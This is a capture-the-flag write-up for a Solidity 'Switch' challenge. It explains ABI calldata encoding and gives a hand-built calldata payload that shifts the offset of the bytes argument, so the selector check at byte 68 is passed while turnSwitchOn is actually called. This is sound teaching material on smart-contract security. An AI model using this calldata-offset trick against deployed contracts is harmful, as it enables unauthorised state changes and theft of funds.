## Challenge
~~~
Just have to flip the switch. Can't be that hard, right?

##### Things that might help:

Understanding how `CALLDATA` is encoded.
~~~
## Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success,) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}
```
`

## Solution

Single contract with:
- two state variables -` bool switchOn` and `bytes4 offSelector` 
- two modifiers `onlyThis` which allows only the contract to call its functions, `onlyOff` which checks if certain part of calldata is the function selector
- two functions which can be called only by the contract - `turnSwitchOn()` and `turnSwitchOff()`
- one public function which accepts data and internally uses `call()` to send it to the current contract

We need a certain `bytes data` to pass to that function to bypass this check `selector[0] == offSelector`



calldatacopy accepts three arguments:
- destOffset - byte offset in memory where the result will be copied
- offset - byte offset in the calldata to copy
- size - bytesize to copy
  
  normal encoding of calldata for `flipswitch(bytes _data)`
  func_selector (4bytes)
  position in bytes where `_data`(bytes are encoded with size and actual encoding of the data) starts (32 bytes, left padded)
  encoded size in hexadecimal format (32bytes, left padded)
  actual `_data` (32bytes * X, padded right)


There is a check for the 4 bytes starting from the 68th byte in our calldata, this is where the `_data` starts in normal packed calldata and as it the place where the function selector is expected to be. We can bypass it by specifying another place where `_data would start` and write to the expected func selector from 68th to 72nd byte.

30c13ade <- flipSwitch selector
0000000000000000000000000000000000000000000000000000000000000020 -> position where encoded `_data` is
0000000000000000000000000000000000000000000000000000000000000004 -> size of `_data`
1234567800000000000000000000000000000000000000000000000000000000 -> `_data` (dummy func selector here)

30c13ade
0000000000000000000000000000000000000000000000000000000000000060
0000000000000000000000000000000000000000000000000000000000000000
20606e1500000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000004
76227e1200000000000000000000000000000000000000000000000000000000

## Key takeaways and useful resources


https://www.youtube.com/watch?v=upVloLUw5Z0
